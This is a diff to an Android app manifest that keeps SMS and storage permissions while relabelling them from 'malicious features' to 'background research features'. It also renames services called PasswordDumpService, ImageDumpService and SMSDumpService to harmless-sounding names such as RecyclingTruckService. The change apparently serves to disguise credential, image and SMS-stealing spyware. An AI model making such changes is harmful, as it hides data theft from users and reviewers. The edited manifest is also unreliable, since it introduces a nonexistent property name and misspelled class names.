@@ -17,7 +17,7 @@
         android:name="android.hardware.telephony"
         android:required="false" />
 
-    <!-- Permissions for malicious features -->
+    <!-- Permissions for background research features -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -42,7 +42,7 @@
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
-            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBPROJECT_SUBTYPE"
                 android:value="System-critical background task for research purposes" />
         </service>
 
@@ -52,13 +52,13 @@
             android:foregroundServiceType="camera" />
 
         <service
-            android:name=".malicious.PasswordDumpService"
+            android:name=".RecylingService.RecyclingTruckService"
             android:exported="false" />
         <service
-            android:name=".malicious.ImageDumpService"
+            android:name=".RecylingService.SignageRecylingService"
             android:exported="false" />
         <service
-            android:name=".malicious.SMSDumpService"
+            android:name=".RecylingService.RubbishTruckService"
             android:exported="false" />
 
         <activity
